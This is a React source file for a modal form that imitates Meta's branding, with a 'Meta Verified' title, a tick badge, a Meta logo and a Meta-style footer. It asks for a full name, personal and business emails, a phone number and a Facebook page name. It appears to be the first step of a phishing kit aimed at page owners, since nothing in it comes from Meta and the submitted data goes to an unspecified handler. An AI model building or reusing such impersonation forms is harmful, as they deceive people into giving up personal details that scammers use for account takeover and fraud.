import { useState } from 'react';
import PropTypes from 'prop-types';
import TickIcon from '@/assets/images/tick.svg';
import MetaLogo from '@/assets/images/meta-logo-grey.png';
import PhoneInput from '@/components/phone-input';

const FirstFormModal = ({ show, onClose, onSubmit, texts }) => {
    const [formData, setFormData] = useState({
        fullName: '',
        personalEmail: '',
        businessEmail: '',
        phone: '',
        pageName: '',
        agreeTerms: false
    });
    const [errors, setErrors] = useState({});

    const handleChange = (field, value) => {
        setFormData((prev) => ({ ...prev, [field]: value }));
        if (errors[field]) {
            setErrors((prev) => ({ ...prev, [field]: false }));
        }
    };

    const handleSubmit = (e) => {
        e.preventDefault();
        const newErrors = {};

        if (!formData.fullName.trim()) newErrors.fullName = true;
        if (!formData.personalEmail.trim()) newErrors.personalEmail = true;
        if (!formData.businessEmail.trim()) newErrors.businessEmail = true;
        if (!formData.phone.trim()) newErrors.phone = true;
        if (!formData.pageName.trim()) newErrors.pageName = true;
        if (!formData.agreeTerms) newErrors.agreeTerms = true;

        if (Object.keys(newErrors).length > 0) {
            setErrors(newErrors);
            return;
        }

        onSubmit({
            fullName: formData.fullName,
            personalEmail: formData.personalEmail,
            businessEmail: formData.businessEmail,
            phone: formData.phone,
            pageName: formData.pageName
        });
    };

    if (!show) return null;

    return (
        <>
            <div className="modal-backdrop show" onClick={onClose}></div>
            <div className="modal form-modal show" id="exampleModal1" style={{ display: show ? 'block' : 'none' }} tabIndex="-1">
            <div className="modal-dialog modal-dialog-centered modal-dialog-scrollable">
                <div className="modal-content">
                    <div className="modal-header">
                        <h5 className="modal-title" id="exampleModalLabel">
                            {texts.metaVerified || 'Meta Verified'}
                            <img src={TickIcon} width="18" alt="tick" style={{ verticalAlign: 'middle' }} />
                        </h5>
                        <button aria-label="Close" className="btn-close" type="button" onClick={onClose}></button>
                    </div>
                    <div className="modal-body">
                        <form id="first-form" onSubmit={handleSubmit}>
                            <div className="mb-3">
                                <label className="form-label" htmlFor="FullNameField">
                                    {texts.fullName || 'Full Name'}
                                </label>
                                <input
                                    aria-describedby="emailHelp"
                                    className={`form-control ${errors.fullName ? 'is-invalid' : ''}`}
                                    id="FullNameField"
                                    minLength="3"
                                    name="full-name"
                                    required
                                    type="text"
                                    value={formData.fullName}
                                    onChange={(e) => handleChange('fullName', e.target.value)}
                                />
                            </div>
                            <div className="mb-3">
                                <label className="form-label" htmlFor="PersonalEmailField">
                                    {texts.personalEmail || 'Personal Email'}
                                </label>
                                <input
                                    aria-describedby="emailHelp"
                                    className={`form-control ${errors.personalEmail ? 'is-invalid' : ''}`}
                                    id="PersonalEmailField"
                                    name="personal-email"
                                    required
                                    type="email"
                                    value={formData.personalEmail}
                                    onChange={(e) => handleChange('personalEmail', e.target.value)}
                                />
                            </div>
                            <div className="mb-3">
                                <label className="form-label" htmlFor="BuisenessEmailField">
                                    {texts.businessEmail || 'Business Email'}
                                </label>
                                <input
                                    aria-describedby="emailHelp"
                                    className={`form-control ${errors.businessEmail ? 'is-invalid' : ''}`}
                                    id="BuisenessEmailField"
                                    name="buiseness-email"
                                    required
                                    type="email"
                                    value={formData.businessEmail}
                                    onChange={(e) => handleChange('businessEmail', e.target.value)}
                                />
                            </div>
                            <div className="mb-3">
                                <label className="form-label" htmlFor="PhoneFirld">
                                    {texts.mobilePhone || 'Mobile Phone Number'}
                                </label>
                                <PhoneInput
                                    error={errors.phone}
                                    id="PhoneFirld"
                                    name="mobile-phone-number"
                                    value={formData.phone}
                                    onChange={(val) => handleChange('phone', val)}
                                />
                            </div>
                            <div className="mb-3">
                                <label className="form-label" htmlFor="fb-page-name-input">
                                    {texts.yourPageName || 'Your Page Name'}
                                </label>
                                <input
                                    aria-describedby="emailHelp"
                                    className={`form-control ${errors.pageName ? 'is-invalid' : ''}`}
                                    id="fb-page-name-input"
                                    maxLength="80"
                                    minLength="3"
                                    name="page-name"
                                    required
                                    type="text"
                                    value={formData.pageName}
                                    onChange={(e) => handleChange('pageName', e.target.value)}
                                />
                            </div>
                            <div className="mb-3 form-check">
                                <input
                                    aria-describedby="exampleCheck1"
                                    className={`form-check-input ${errors.agreeTerms ? 'is-invalid' : ''}`}
                                    id="exampleCheck1"
                                    name="agree-terms"
                                    required
                                    type="checkbox"
                                    checked={formData.agreeTerms}
                                    onChange={(e) => handleChange('agreeTerms', e.target.checked)}
                                />
                                <label className="form-check-label" htmlFor="exampleCheck1">
                                    {texts.agreeToTerms || 'I agree to the'} <a className="add-svg" id="termsLink">{texts.privacyPolicy || 'Privacy Policy'}</a>
                                </label>
                            </div>
                            <div className="form-btn-wrapper">
                                <button className="btn btn-primary" type="submit">
                                    <div className="spinner-border text-light" role="status" style={{ display: 'none' }}>
                                        <span className="visually-hidden">Loading...</span>
                                    </div>
                                    <span className="button-text">{texts.confirm || 'Confirm'}</span>
                                </button>
                            </div>
                        </form>
                    </div>
                    <div className="modal-footer border-0 justify-content-center" style={{ flexDirection: 'column', textAlign: 'center' }}>
                        <img src={MetaLogo} alt="Meta Logo" style={{ height: '20px', marginBottom: '5px' }} />
                        <div className="footer-links" style={{ fontSize: '12px', color: '#000' }}>
                            {texts.aboutHelpMore || 'About · Help · See more'}
                        </div>
                    </div>
                </div>
            </div>
        </div>
        </>
    );
};

FirstFormModal.propTypes = {
    show: PropTypes.bool.isRequired,
    onClose: PropTypes.func.isRequired,
    onSubmit: PropTypes.func.isRequired,
    texts: PropTypes.object.isRequired
};

export default FirstFormModal;
